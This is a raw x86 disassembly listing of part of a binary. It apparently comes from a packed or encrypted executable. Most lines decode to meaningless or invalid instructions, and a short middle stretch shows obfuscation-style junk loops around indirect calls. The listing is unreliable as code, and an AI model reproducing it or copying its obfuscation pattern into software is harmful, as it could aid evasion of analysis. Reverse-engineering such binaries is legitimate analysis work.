  40a65b:	push   0x13eb1c78
  40a660:	inc    esp
  40a661:	sbb    DWORD PTR [edi+0x315511b2],0x728e130e
  40a66b:	(bad)  
  40a66c:	cmc    
  40a66d:	gs (bad) 
  40a66f:	mov    ds:0xe6843fa2,eax
  40a674:	cmp    al,0x32
  40a676:	(bad)  
  40a677:	fidivr WORD PTR [esi+ebp*8]
  40a67a:	mov    ebx,0x642b4c67
  40a67f:	mov    dl,0x6b
  40a681:	cmp    DWORD PTR [ebx+ebx*8+0x38],0x18f573e1
  40a689:	icebp  
  40a68a:	hlt    
  40a68b:	lods   eax,DWORD PTR ds:[esi]
  40a68c:	fistp  WORD PTR [edi-0x70c8b04f]
  40a692:	aam    0x6f
  40a694:	dec    eax
  40a695:	mov    bl,BYTE PTR [bp+di+0x277b]
  40a69a:	stc    
  40a69b:	sub    al,0xf4
  40a69d:	int3   
  40a69e:	add    ch,BYTE PTR [edi-0x235ec4d7]
  40a6a4:	data16 mov al,0x55
  40a6a7:	inc    ebp
  40a6a8:	jbe    0x40a6c7
  40a6aa:	lea    eax,[eax-0x79]
  40a6ad:	jl     0x40a6c3
  40a6af:	adc    BYTE PTR [edx+edx*4],dh
  40a6b2:	stos   BYTE PTR es:[edi],al
  40a6b3:	hlt    
  40a6b4:	sbb    eax,0xf71d0e8
  40a6b9:	fimul  WORD PTR [esi+edi*2]
  40a6bc:	inc    esi
  40a6bd:	sub    bl,bl
  40a6bf:	stos   BYTE PTR es:[edi],al
  40a6c0:	rol    ebp,1
  40a6c2:	or     edx,DWORD PTR [eax-0x6b]
  40a6c5:	push   es
  40a6c6:	jecxz  0x40a707
  40a6c8:	popf   
  40a6c9:	loop   0x40a650
  40a6cb:	jnp    0x40a737
  40a6cd:	cmp    edi,esp
  40a6cf:	lods   al,BYTE PTR ds:[esi]
  40a6d0:	jnp    0x40a73d
  40a6d2:	fcmovnbe st,st(7)
  40a6d4:	ss push ecx
  40a6d6:	loop   0x40a700
  40a6d8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a6d9:	jle    0x40a66b
  40a6db:	outs   dx,DWORD PTR ds:[esi]
  40a6dc:	adc    esi,edx
  40a6de:	repnz pop ebp
  40a6e0:	cmp    eax,0xbeff98ea
  40a6e5:	fs cli 
  40a6e7:	sub    esp,DWORD PTR [ebx-0x7c34dee2]
  40a6ed:	pop    ebp
  40a6ee:	loop   0x40a756
  40a6f0:	aam    0x2a
  40a6f2:	xchg   edx,eax
  40a6f3:	dec    BYTE PTR [ecx-0x4f12057c]
  40a6f9:	jl     0x40a6ac
  40a6fb:	je     0x40a732
  40a6fd:	scas   eax,DWORD PTR es:[edi]
  40a6fe:	lods   eax,DWORD PTR ds:[esi]
  40a6ff:	add    eax,0x70d3b68
  40a704:	pop    ebp
  40a705:	ds xchg esi,eax
  40a707:	retf   0xa189
  40a70a:	frstor [ecx+ebp*4+0x3805ae61]
  40a711:	push   0xffffffb0
  40a713:	ins    BYTE PTR es:[edi],dx
  40a714:	lea    esp,[esp+ebx*1-0x1dde2cb5]
  40a71b:	xor    ch,BYTE PTR [esi+0x67149f3d]
  40a721:	call   0x3610:0x861ebb4e
  40a728:	inc    edx
  40a729:	scas   eax,DWORD PTR es:[edi]
  40a72a:	mov    al,0x7c
  40a72c:	sbb    BYTE PTR ds:0x1b106bb0,cl
  40a732:	mov    BYTE PTR [edi+edi*2],dh
  40a735:	jmp    0x7a47:0xb015675a
  40a73c:	sub    eax,0xaf0692b0
  40a741:	sbb    ah,BYTE PTR [ebp-0x1e80b91c]
  40a747:	xchg   esi,eax
  40a748:	dec    eax
  40a749:	xchg   edi,eax
  40a74a:	iret   
  40a74b:	pop    ebx
  40a74c:	into   
  40a74d:	imul   ebp,ebp,0x5903b948
  40a753:	cmp    cl,BYTE PTR [ecx-0x7a5fe05a]
  40a759:	mov    WORD PTR [ecx+0x1],ds
  40a75c:	pop    esp
  40a75d:	cmc    
  40a75e:	ror    DWORD PTR [edx+0x6170ad15],cl
  40a764:	or     eax,0x229ac3dc
  40a769:	or     DWORD PTR [edx-0x59],0x264939a4
  40a770:	sbb    BYTE PTR [eax+0x42a984f1],bh
  40a776:	(bad)  
  40a777:	aam    0xd8
  40a779:	xchg   ebx,eax
  40a77a:	fwait
  40a77b:	loopne 0x40a7e2
  40a77d:	jg     0x40a78e
  40a77f:	mov    ds:0xe5d78c27,eax
  40a784:	mov    ebp,0x2c9d5354
  40a789:	xor    bh,BYTE PTR [edx]
  40a78b:	xor    BYTE PTR [ebp-0x6743d1ae],bl
  40a791:	adc    edx,ebx
  40a793:	cs jnp 0x40a783
  40a796:	pusha  
  40a797:	call   0xe6389c8e
  40a79c:	xor    al,0xba
  40a79e:	les    esp,FWORD PTR [ecx]
  40a7a0:	and    BYTE PTR [ecx],cl
  40a7a2:	lock ret 
  40a7a4:	push   ecx
  40a7a5:	loopne 0x40a7cb
  40a7a7:	jl     0x40a72f
  40a7a9:	lahf   
  40a7aa:	repz test BYTE PTR [eax+0xe],0xd3
  40a7af:	mov    dh,0xc8
  40a7b1:	cli    
  40a7b2:	adc    eax,0x8230de35
  40a7b7:	and    al,0x98
  40a7b9:	xchg   ah,ch
  40a7bb:	pop    ss
  40a7bc:	je     0x40a816
  40a7be:	adc    DWORD PTR [edx-0x19],edx
  40a7c1:	fs in  al,dx
  40a7c3:	out    dx,eax
  40a7c4:	test   BYTE PTR [ecx-0x2ff3dc4e],bh
  40a7ca:	and    al,0x4
  40a7cc:	imul   ebx,DWORD PTR ds:0xa3969a3e,0xffffffa3
  40a7d3:	pop    ecx
  40a7d4:	daa    
  40a7d5:	xchg   ebp,eax
  40a7d6:	in     al,0xe2
  40a7d8:	pushf  
  40a7d9:	jo     0x40a7b4
  40a7db:	bound  edx,QWORD PTR [edi+0x2b]
  40a7de:	jnp    0x40a834
  40a7e0:	cmp    BYTE PTR [eax-0x48],ch
  40a7e3:	mov    ebp,0xab1059ec
  40a7e8:	and    BYTE PTR [esi+esi*8],dl
  40a7eb:	aas    
  40a7ec:	lahf   
  40a7ed:	sar    BYTE PTR [ebx+0x7f],0xe2
  40a7f1:	cwde   
  40a7f2:	jne    0x40a78d
  40a7f4:	xchg   edi,eax
  40a7f5:	xchg   DWORD PTR [eax],eax
  40a7f7:	push   0xffffffda
  40a7f9:	js     0x40a7ce
  40a7fb:	shl    BYTE PTR [edx-0xc],cl
  40a7fe:	cmp    al,0x8e
  40a800:	aad    0xe4
  40a802:	push   ecx
  40a803:	push   cs
  40a804:	test   eax,0xe8e698c3
  40a809:	fdiv   st,st(7)
  40a80b:	sub    ebx,edx
  40a80d:	mov    ds:0xb9fbadd8,al
  40a812:	dec    ebp
  40a813:	sbb    esi,esi
  40a815:	fwait
  40a816:	adc    edx,ebp
  40a818:	pop    ebx
  40a819:	jno    0x40a817
  40a81b:	push   edi
  40a81c:	repnz ins DWORD PTR es:[edi],dx
  40a81e:	rol    BYTE PTR [ecx+0x8],0xa
  40a822:	cmp    BYTE PTR [ebx+0x25],dl
  40a825:	mov    esi,0x221dbbea
  40a82a:	or     eax,0x6f5157a
  40a82f:	mov    esi,0xe4cecfe
  40a834:	fld    st(1)
  40a836:	das    
  40a837:	sbb    bl,BYTE PTR [edi-0x7d6cc585]
  40a83d:	cwde   
  40a83e:	or     edi,DWORD PTR [ecx+0x75]
  40a841:	mov    ds:0xb2955028,al
  40a846:	mov    BYTE PTR [eax+0x64a7a991],cl
  40a84c:	inc    ecx
  40a84d:	dec    ebx
  40a84e:	xchg   edi,eax
  40a84f:	mov    ecx,0xeb980e08
  40a854:	aas    
  40a855:	add    DWORD PTR [edx+0xd6543b0],edi
  40a85b:	imul   ebx,DWORD PTR [eax+esi*1+0x76ddd5dc],0x7
  40a863:	and    bl,BYTE PTR [ebp+0x73ef3361]
  40a869:	push   ebp
  40a86a:	dec    eax
  40a86b:	sbb    bl,BYTE PTR [edx-0xe]
  40a86e:	xchg   BYTE PTR [eax],dh
  40a870:	xchg   edi,eax
  40a871:	jo     0x40a881
  40a873:	sbb    ecx,DWORD PTR [ecx]
  40a875:	push   edi
  40a876:	jmp    0x40a813
  40a878:	xor    bl,al
  40a87a:	mov    dl,0xec
  40a87c:	dec    ecx
  40a87d:	mov    dl,0xec
  40a87f:	adc    eax,0xe937ce9a
  40a884:	cwde   
  40a885:	popf   
  40a886:	fsubr  st(7),st
  40a888:	repz mov es,ebx
  40a88b:	scas   al,BYTE PTR es:[edi]
  40a88c:	dec    edi
  40a88d:	in     eax,0x13
  40a88f:	cdq    
  40a890:	sbb    al,0x6
  40a892:	mov    ah,0xd4
  40a894:	icebp  
  40a895:	stos   BYTE PTR es:[edi],al
  40a896:	call   0x576b:0x8a375ec4
  40a89d:	ins    BYTE PTR es:[edi],dx
  40a89e:	pop    ebx
  40a89f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8a0:	mov    ds:0xededf858,al
  40a8a5:	(bad)  [edi-0x40]
  40a8a8:	mov    ecx,es
  40a8aa:	push   0xffffffe4
  40a8ac:	mov    eax,ds:0x96d7dfe8
  40a8b1:	scas   al,BYTE PTR es:[edi]
  40a8b2:	dec    edi
  40a8b3:	add    eax,0x92a90f81
  40a8b8:	add    bl,dh
  40a8ba:	icebp  
  40a8bb:	cmp    bl,BYTE PTR [edx-0x5a]
  40a8be:	bound  ebx,QWORD PTR ds:0xbd58d4d5
  40a8c4:	mov    bl,0x54
  40a8c6:	fdiv   DWORD PTR [esi-0xf4c872f]
  40a8cc:	jae    0x40a888
  40a8ce:	in     al,dx
  40a8cf:	popf   
  40a8d0:	add    al,0xf7
  40a8d2:	shr    BYTE PTR [eax+0x4b97dd5c],0x44
  40a8d9:	pop    ss
  40a8da:	xchg   esp,eax
  40a8db:	cmp    al,0xc0
  40a8dd:	test   BYTE PTR [ecx+0x45a9f17],bh
  40a8e3:	sbb    eax,0xb2c3a828
  40a8e8:	adc    al,0xc
  40a8ea:	xchg   esi,eax
  40a8eb:	or     eax,0x4543811b
  40a8f0:	lds    eax,FWORD PTR [edx]
  40a8f2:	ficom  DWORD PTR [ebx-0x4a961787]
  40a8f8:	fisttp WORD PTR [edi]
  40a8fa:	stos   DWORD PTR es:[edi],eax
  40a8fb:	les    ebx,FWORD PTR [ecx+0x1b9753e1]
  40a901:	test   ebx,ebx
  40a903:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a904:	fs inc ecx
  40a906:	out    0x68,al
  40a908:	or     bh,bl
  40a90a:	rcr    DWORD PTR [ebp+0x78],cl
  40a90d:	mov    edx,0xea99667
  40a912:	std    
  40a913:	push   0xffffffa2
  40a915:	sub    BYTE PTR [ebx],0xcd
  40a918:	das    
  40a919:	jno    0x40a8e0
  40a91b:	xor    eax,0x1bf1d229
  40a920:	sub    DWORD PTR [esi+ebx*4+0x51],esp
  40a924:	or     eax,0xb390d31d
  40a929:	sub    BYTE PTR [ecx],al
  40a92b:	out    0xf,eax
  40a92d:	jnp    0x40a8ea
  40a92f:	outs   dx,DWORD PTR ds:[esi]
  40a930:	idiv   BYTE PTR [esi]
  40a932:	mov    WORD PTR [ebp+0x4621cf48],es
  40a938:	mov    esp,0x29db85cf
  40a93d:	cld    
  40a93e:	cwde   
  40a93f:	push   ebp
  40a940:	inc    ebp
  40a941:	inc    ecx
  40a942:	pusha  
  40a943:	push   0x26ba102b
  40a948:	jmp    0xdc7a6610
  40a94d:	pushf  
  40a94e:	(bad)  [esi-0x8]
  40a951:	mov    ch,0xd8
  40a953:	cmp    eax,0x9338ee09
  40a958:	ss push ds
  40a95a:	sub    BYTE PTR ds:0x52228fe4,bl
  40a960:	add    al,0x0
  40a962:	jo     0x40a915
  40a964:	cmc    
  40a965:	dec    edi
  40a966:	in     al,dx
  40a967:	add    al,0x9c
  40a969:	dec    edx
  40a96a:	mov    dh,0x5
  40a96c:	pop    esp
  40a96d:	dec    ebp
  40a96e:	cwde   
  40a96f:	rol    eax,cl
  40a971:	push   edx
  40a972:	(bad)  
  40a973:	fs xor al,0x7a
  40a976:	(bad)  
  40a977:	mov    fs,WORD PTR [ebx+0x7c14c56b]
  40a97d:	jb     0x40a9d9
  40a97f:	cmc    
  40a980:	mov    al,ds:0x817de853
  40a985:	mov    BYTE PTR [esi+0x36a3cbb6],ch
  40a98b:	mul    BYTE PTR [esi+0x17]
  40a98e:	jnp    0x40a999
  40a990:	jo     0x40a9e8
  40a992:	or     DWORD PTR ds:0x428e7f,0x7ae1
  40a99c:	mov    esi,0x75108af
  40a9a1:	xor    eax,esi
  40a9a3:	push   edi
  40a9a4:	and    edi,0x47d2
  40a9aa:	mov    edi,0x3272f6
  40a9af:	and    DWORD PTR ds:0x428e57,0xe9
  40a9b9:	add    eax,edi
  40a9bb:	mov    DWORD PTR [ebp-0x1c],eax
  40a9be:	mov    eax,DWORD PTR [ebp+0x14]
  40a9c1:	adc    DWORD PTR ds:0x428e97,0x7644
  40a9cb:	test   eax,eax
  40a9cd:	je     0x40aa21
  40a9d3:	and    DWORD PTR ds:0x428e83,0x0
  40a9dd:	mov    eax,ds:0x428e83
  40a9e2:	inc    eax
  40a9e3:	mov    ds:0x428e83,eax
  40a9e8:	cmp    DWORD PTR ds:0x428e83,0x1e
  40a9ef:	jl     0x40aa18
  40a9f5:	jmp    0x40aa0b
  40a9fa:	push   DWORD PTR [ebp-0x24]
  40a9fd:	push   0x428e43
  40aa02:	push   DWORD PTR [ebp-0x10]
  40aa05:	call   DWORD PTR ds:0x42a9ef
  40aa0b:	cmp    DWORD PTR ds:0x428e83,0x17
  40aa12:	jb     0x40a9dd
  40aa18:	mov    eax,DWORD PTR [ebp+0x14]
  40aa1b:	mov    eax,DWORD PTR [eax]
  40aa1d:	dec    ebx
  40aa1e:	mov    DWORD PTR [ebp-0x1c],eax
  40aa21:	mov    eax,DWORD PTR [ebp-0x4]
  40aa24:	xor    DWORD PTR ds:0x428e2b,0x506a
  40aa2e:	xor    eax,esi
  40aa30:	and    DWORD PTR ds:0x428e7f,edi
  40aa36:	add    eax,edi
  40aa38:	mov    DWORD PTR [ebp-0x8],eax
  40aa3b:	mov    DWORD PTR ds:0x428e97,0x1e
  40aa45:	cmp    DWORD PTR ds:0x428e97,0x0
  40aa4c:	je     0x40aa81
  40aa52:	cmp    DWORD PTR ds:0x428e97,0x20
  40aa59:	jg     0x40aa81
  40aa5f:	jmp    0x40aa6f
  40aa64:	push   0x4281a7
  40aa69:	call   DWORD PTR ds:0x42a9bb
  40aa6f:	mov    ebx,DWORD PTR ds:0x428e97
  40aa75:	dec    ebx
  40aa76:	mov    DWORD PTR ds:0x428e97,ebx
  40aa7c:	jmp    0x40aa45
  40aa81:	mov    eax,DWORD PTR [ebp-0xc]
  40aa84:	add    DWORD PTR ds:0x428eaf,edx
  40aa8a:	xor    eax,esi
  40aa8c:	add    eax,edi
  40aa8e:	mov    ebx,DWORD PTR ds:0x429beb
  40aa94:	mov    ebx,DWORD PTR [ebx]
  40aa96:	or     DWORD PTR ds:0x428ebb,ebx
  40aa9c:	mov    DWORD PTR [ebp-0x24],eax
  40aa9f:	and    DWORD PTR ds:0x428e27,0x0
  40aaa9:	jmp    0x40aabb
  40aaae:	mov    ebx,DWORD PTR ds:0x428e27
  40aab4:	inc    ebx
  40aab5:	mov    DWORD PTR ds:0x428e27,ebx
  40aabb:	cmp    DWORD PTR ds:0x428e27,0x13
  40aac2:	jae    0x40ce99
  40aac8:	cmp    DWORD PTR ds:0x428e27,0x18
  40aacf:	jle    0x40ce99
  40aad5:	jmp    0x40aae5
  40aada:	push   0x428173
  40aadf:	call   DWORD PTR ds:0x42a9bf
  40aae5:	jmp    0x40aaae
  40aaea:	jmp    0x40ce99
  40aaef:	dec    edx
  40aaf0:	shr    ah,1
  40aaf2:	shl    esp,0x9d
  40aaf5:	push   es
  40aaf6:	mov    bl,dl
  40aaf8:	adc    BYTE PTR [edx+0x6f],bh
  40aafb:	push   ds
  40aafc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aafd:	fs leave 
  40aaff:	out    0xf6,eax
  40ab01:	add    DWORD PTR [ebx-0x7c7c9f0f],0x72
  40ab08:	arpl   WORD PTR [ebp-0x8d3c0b2],bx
  40ab0e:	sub    eax,0x8012d8f3
  40ab13:	pop    ebx
  40ab14:	jmp    0x40aaf0
  40ab16:	pop    ds
  40ab17:	cmp    al,0x6b
  40ab19:	mov    ds:0xb90b093b,eax
  40ab1e:	repnz scas eax,DWORD PTR es:[edi]
  40ab20:	inc    edx
  40ab21:	mov    cl,0xc2
  40ab23:	or     al,0xdf
  40ab25:	mov    dh,0xba
  40ab27:	dec    esi
  40ab28:	div    DWORD PTR [edx+0x1a]
  40ab2b:	push   cs
  40ab2c:	retf   0xad91
  40ab2f:	iret   
  40ab30:	int    0x8f
  40ab32:	xor    BYTE PTR ds:0x2afbc71f,0xb2
  40ab39:	push   esi
  40ab3a:	add    al,0x42
  40ab3c:	in     eax,0x22
  40ab3e:	jmp    0x1051b318
  40ab43:	and    esi,edi
  40ab45:	mov    DWORD PTR [ecx],esp
  40ab47:	cmp    DWORD PTR [edi-0x5b],ebp
  40ab4a:	xchg   ebx,eax
  40ab4b:	std    
  40ab4c:	fld    TBYTE PTR [ebx+0x16c234ea]
  40ab52:	cmp    bh,ch
  40ab54:	mov    es,WORD PTR [esi+0x4bde2a89]
  40ab5a:	jmp    0xb1887a09
  40ab5f:	push   0x604a83f1
  40ab64:	sahf   
  40ab65:	mov    esp,0xa9efdf90
  40ab6a:	jge    0x40aaf1
  40ab6c:	pop    edi
  40ab6d:	js     0x40ab36
  40ab6f:	mov    ah,0xcf
  40ab71:	and    eax,0x4be54ac5
  40ab76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ab77:	mov    ebp,0x698dc970
  40ab7c:	and    al,0xe2
  40ab7e:	scas   al,BYTE PTR es:[edi]
  40ab7f:	shl    BYTE PTR [edi-0x35],cl
  40ab82:	jnp    0x40ab2e
  40ab84:	ss inc esp
  40ab86:	scas   eax,DWORD PTR es:[edi]
  40ab87:	adc    ah,dh
  40ab89:	jp     0x40ab7e
  40ab8b:	push   ds
  40ab8c:	sub    ah,BYTE PTR ds:0x477d4eb7
  40ab92:	ret    
  40ab93:	test   al,0xc0
  40ab95:	cwde   
  40ab96:	pop    gs
  40ab98:	jge    0x40ab1e
  40ab9a:	popa   
  40ab9b:	sar    BYTE PTR [ebx+0x41],cl
  40ab9e:	sbb    DWORD PTR [ebx],esp
  40aba0:	push   esi
  40aba1:	adc    DWORD PTR [ebx-0x41],ecx
  40aba4:	aam    0x37
  40aba6:	cmp    ebx,ebx
  40aba8:	push   ecx
  40aba9:	mov    cl,0xd1
  40abab:	or     BYTE PTR [esi-0x31],dl
  40abae:	leave  
  40abaf:	jb     0x40abd2
  40abb1:	pop    ebp
  40abb2:	or     eax,0xaee2799c
  40abb7:	or     BYTE PTR [edi+0x1cef27ae],dh
  40abbd:	rol    DWORD PTR [eax+0x50c20616],1
  40abc3:	stos   DWORD PTR es:[edi],eax
  40abc4:	lds    esi,FWORD PTR [ecx-0x3a585b88]
  40abca:	adc    DWORD PTR [esi],0xffffff81
  40abcd:	dec    ebp
  40abce:	das    
  40abcf:	cmp    ah,dl
  40abd1:	push   esp
  40abd2:	out    dx,eax
  40abd3:	xor    DWORD PTR [edx],0xa12ac9c5
  40abd9:	mov    dh,0x22
  40abdb:	gs jg  0x40ac45
  40abde:	cdq    
  40abdf:	lods   al,BYTE PTR ds:[esi]
  40abe0:	adc    al,0x4a
  40abe2:	outs   dx,BYTE PTR ds:[esi]
  40abe3:	inc    esi
  40abe4:	je     0x40abeb
  40abe6:	pop    edi
  40abe7:	adc    DWORD PTR [ecx*1+0x4f155e97],ecx
  40abee:	pushf  
  40abef:	cmp    esi,ebx
  40abf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40abf2:	iret   
  40abf3:	push   es
  40abf4:	or     DWORD PTR [eax],esp
  40abf6:	mov    cl,0x8f
  40abf8:	add    DWORD PTR [edx-0x419bb2b2],esp
  40abfe:	or     BYTE PTR [ebx+0x59],dl
  40ac01:	ss cwde 
  40ac03:	adc    BYTE PTR [esp-0x1c66e3f9],0x5d
  40ac0b:	cmc    
  40ac0c:	add    eax,0x8483971a
  40ac11:	jmp    0x40aba1
  40ac13:	dec    edi
  40ac14:	push   ebp
  40ac15:	sub    al,0xd3
  40ac17:	out    dx,eax
  40ac18:	gs out 0x9e,eax
  40ac1b:	in     eax,dx
  40ac1c:	ja     0x40ac00
  40ac1e:	mov    ch,0xb8
  40ac20:	popa   
  40ac21:	aas    
  40ac22:	or     ebx,edi
  40ac24:	mov    dl,0x37
  40ac26:	or     ah,BYTE PTR [edx]
  40ac28:	jns    0x40ac75
  40ac2a:	ret    
  40ac2b:	mov    cl,0x60
  40ac2d:	sahf   
  40ac2e:	pop    ebp
  40ac2f:	mov    WORD PTR [edi],ss
  40ac31:	aad    0xc4
  40ac33:	add    BYTE PTR [esi-0x80],bh
  40ac36:	jmp    0x9259369c
  40ac3b:	xchg   edx,eax
  40ac3c:	leave  
  40ac3d:	add    al,BYTE PTR [eax]
  40ac3f:	mov    ch,BYTE PTR [ebx]
  40ac41:	icebp  
  40ac42:	add    bh,BYTE PTR [ecx]
  40ac44:	cs mov dl,0xca
  40ac47:	in     al,0x1c
  40ac49:	mov    BYTE PTR [ebx],0xd7
  40ac4c:	sub    eax,0x9cfda588
  40ac51:	cmp    eax,0x379c68fe
  40ac56:	mov    bh,0x7a
  40ac58:	in     al,dx
  40ac59:	sub    DWORD PTR [ecx-0x7f],ebx
  40ac5c:	and    BYTE PTR ds:0xb39d8cd6,bh
  40ac62:	jp     0x40ac5b
  40ac64:	test   ah,al
  40ac66:	push   ebx
  40ac67:	cmp    BYTE PTR [eax-0x3d507837],ah
  40ac6d:	cs cwde 
  40ac6f:	adc    al,0xd9
  40ac71:	fmul   DWORD PTR ds:0xfe9cbf2c
  40ac77:	dec    eax
  40ac78:	xchg   ebx,eax
  40ac79:	repnz mov cl,0x50
  40ac7c:	mov    bl,0x1
  40ac7e:	addr16 loopne 0x40acca
  40ac81:	adc    al,0x88
  40ac83:	pop    edi
  40ac84:	iret   
  40ac85:	add    eax,0xc5a134f8
  40ac8a:	out    0x18,eax
  40ac8c:	pusha  
  40ac8d:	xor    eax,0x80fff2f9
  40ac92:	or     DWORD PTR [edi+0x2d50b94c],eax
  40ac98:	pop    es
  40ac99:	jmp    0x67b5:0xb1341542
  40aca0:	icebp  
  40aca1:	sub    ah,BYTE PTR [edi+0x2d]
  40aca4:	mov    ah,0xb
  40aca6:	mov    edx,0xc4d1fb25
  40acab:	retf   0xb1d0
  40acae:	out    0x89,al
  40acb0:	add    eax,eax
  40acb2:	sbb    DWORD PTR [edi-0x3e],ecx
  40acb5:	mov    esp,0xf1635b99
  40acba:	pop    esi
  40acbb:	jge    0x40accc
  40acbd:	xchg   esp,eax
  40acbe:	and    al,0xd4
  40acc0:	mov    ch,0xd0
  40acc2:	inc    ebp
  40acc3:	pop    ss
  40acc4:	sub    BYTE PTR [edi+0x23],ah
  40acc7:	jle    0x40ad40
  40acc9:	cmp    edx,DWORD PTR [esi+ecx*4+0x3c]
  40accd:	rol    BYTE PTR [ebx+0x6121aa95],cl
  40acd3:	pop    esi
  40acd4:	loope  0x40ad28
  40acd6:	test   BYTE PTR [eax],dl
  40acd8:	pusha  
  40acd9:	call   0x6227:0x72de2de9
  40ace0:	arpl   WORD PTR [ebp+0x57],bx
  40ace3:	mov    bh,0x74
  40ace5:	loopne 0x40ad63
  40ace7:	jns    0x40acf5
  40ace9:	ja     0x40ad16
  40aceb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40acec:	adc    bh,BYTE PTR [eax]
  40acee:	loope  0x40acd8
  40acf0:	in     eax,0x14
  40acf2:	xchg   ebx,eax
  40acf3:	pop    es
  40acf4:	fadd   QWORD PTR [ecx]
  40acf6:	repnz mov eax,0xb1f121b7
  40acfc:	xor    DWORD PTR [edx-0x6ca4533e],ebx
  40ad02:	sub    esp,0xffffffd7
  40ad05:	pop    ebp
  40ad06:	fisubr DWORD PTR [eax]
  40ad08:	dec    edx
  40ad09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ad0a:	dec    edx
  40ad0b:	adc    BYTE PTR [esi],0x59
  40ad0e:	push   0x7386e231
  40ad13:	cmp    al,BYTE PTR [ecx+0x68443707]
  40ad19:	std    
  40ad1a:	sbb    edi,edi
  40ad1c:	mov    esi,0x95353e98
  40ad21:	sub    ah,bl
  40ad23:	ss push edi
  40ad25:	mov    bl,0xa6
  40ad27:	pop    ss
  40ad28:	mov    esi,0xf8917fed
  40ad2d:	mov    al,0x8b
  40ad2f:	ins    BYTE PTR es:[edi],dx
  40ad30:	or     al,0xbc
  40ad32:	dec    esp
  40ad33:	cdq    
  40ad34:	cmc    
  40ad35:	lods   al,BYTE PTR ds:[esi]
  40ad36:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ad37:	lods   eax,DWORD PTR ds:[esi]
  40ad38:	xchg   esp,eax
  40ad39:	popf   
  40ad3a:	aas    
  40ad3b:	hlt    
  40ad3c:	das    
  40ad3d:	mov    cl,0x2f
  40ad3f:	pusha  
  40ad40:	xchg   esi,eax
  40ad41:	jmp    0x5d2c:0x1cc82f3a
  40ad48:	outs   dx,BYTE PTR ds:[esi]
  40ad49:	rcr    DWORD PTR [edi-0x4a],0xe7
  40ad4d:	aaa    
  40ad4e:	push   esi
  40ad4f:	add    eax,0xf1a6599a
  40ad54:	sahf   
  40ad55:	out    0x24,al
  40ad57:	aaa    
  40ad58:	xor    eax,0xcc61ac3a
  40ad5d:	xchg   ebp,eax
  40ad5e:	add    edx,ebp
  40ad60:	test   al,0xfe
  40ad62:	jns    0x40acec
  40ad64:	adc    eax,0xd8717d5f
  40ad69:	das    
  40ad6a:	repnz xor DWORD PTR [ebp+0x35],esp
  40ad6e:	pop    esi
  40ad6f:	inc    esp
  40ad70:	fild   DWORD PTR [ebp+edi*2+0x1d]
  40ad74:	adc    eax,0x8e2af0bf
  40ad79:	mul    al
  40ad7b:	mov    edx,0x8976dbd9
  40ad80:	push   es
  40ad81:	in     al,dx
  40ad82:	rcr    DWORD PTR [edx],0xa3
  40ad85:	add    edi,DWORD PTR [edx+0x5d]
  40ad88:	inc    eax
  40ad89:	popf   
  40ad8a:	std    
  40ad8b:	shl    BYTE PTR [edx+0x58],1
  40ad8e:	aaa    
  40ad8f:	jne    0x40ad8c
  40ad91:	xchg   esp,eax
  40ad92:	inc    di
  40ad94:	test   BYTE PTR [edi],bh
  40ad96:	sbb    edx,eax
  40ad98:	shl    DWORD PTR [eax+eax*2-0x5816ad0e],1
  40ad9f:	jl     0x40ade0
  40ada1:	ds daa 
  40ada3:	std    
  40ada4:	sbb    al,0xf8
  40ada6:	(bad)  
  40ada7:	icebp  
  40ada8:	jecxz  0x40ad31
  40adaa:	push   0xcc67c81c
  40adaf:	into   
  40adb0:	push   cs
  40adb1:	lods   eax,DWORD PTR ds:[esi]
  40adb2:	xchg   edx,eax
  40adb3:	pop    eax
  40adb4:	call   0xb890:0x3ef12fbb
  40adbb:	repnz add BYTE PTR [ecx+0x813e50],ah
  40adc2:	sti    
  40adc3:	daa    
  40adc4:	inc    edi
  40adc5:	out    0x93,al
  40adc7:	loope  0x40ad4d
  40adc9:	sub    BYTE PTR [ebx-0x55ad8a9e],0x83
  40add0:	shr    BYTE PTR [ecx+0x1cc6c9c0],cl
  40add6:	aas    
  40add7:	stos   BYTE PTR es:[edi],al
  40add8:	cmp    esp,DWORD PTR [edx]
  40adda:	pop    ss
  40addb:	sub    ebx,DWORD PTR [edx+edx*4+0x44]
  40addf:	repnz in eax,0xfa
  40ade2:	pop    edi
  40ade3:	rol    DWORD PTR [ecx+esi*4+0x5f0a979f],cl
  40adea:	xor    BYTE PTR [edi],bh
  40adec:	outs   dx,BYTE PTR ds:[esi]
  40aded:	es in  al,dx
  40adef:	rcr    BYTE PTR [ebx+edx*8],cl
  40adf2:	inc    esi
  40adf3:	fcmovnb st,st(4)
  40adf5:	(bad)  
  40adf6:	sub    ah,dl
  40adf8:	scas   al,BYTE PTR es:[edi]
  40adf9:	outs   dx,DWORD PTR ds:[esi]
  40adfa:	push   esp
  40adfb:	mov    eax,0x8f5879ba
  40ae00:	mov    fs,WORD PTR [edx+0x13ae187]
  40ae06:	push   esi
  40ae07:	fstp   st(2)
  40ae09:	cmp    esp,ebp
  40ae0b:	and    BYTE PTR [edx+0x38],al
  40ae0e:	mov    esi,DWORD PTR [edi]
  40ae10:	or     al,0x55
  40ae12:	daa    
  40ae13:	pop    eax
  40ae14:	xor    al,0xdf
  40ae16:	xlat   BYTE PTR ds:[ebx]
  40ae17:	adc    BYTE PTR [bp+si-0x2a],bl
  40ae1b:	out    0x31,eax
  40ae1d:	out    dx,eax
  40ae1e:	cmp    bh,cl
  40ae20:	or     ah,BYTE PTR [edi-0x2fc160f1]
  40ae26:	neg    bl
  40ae28:	in     eax,0x72
  40ae2a:	daa    
  40ae2b:	jae    0x40ae33
  40ae2d:	adc    bl,BYTE PTR [edi+0xe]
  40ae30:	cmp    ebp,DWORD PTR [esi]
  40ae32:	(bad)  
  40ae33:	mov    al,0xa2
  40ae35:	xor    DWORD PTR [eax-0x3f],esp
  40ae38:	jge    0x40ae7c
  40ae3a:	mov    ecx,0xbf1a8378
  40ae3f:	(bad)  
  40ae40:	aaa    
  40ae41:	mov    ds:0x91fcadc2,al
  40ae46:	pop    ds
  40ae47:	sub    BYTE PTR [eax+esi*4-0x1402c5e4],cl
  40ae4e:	cmc    
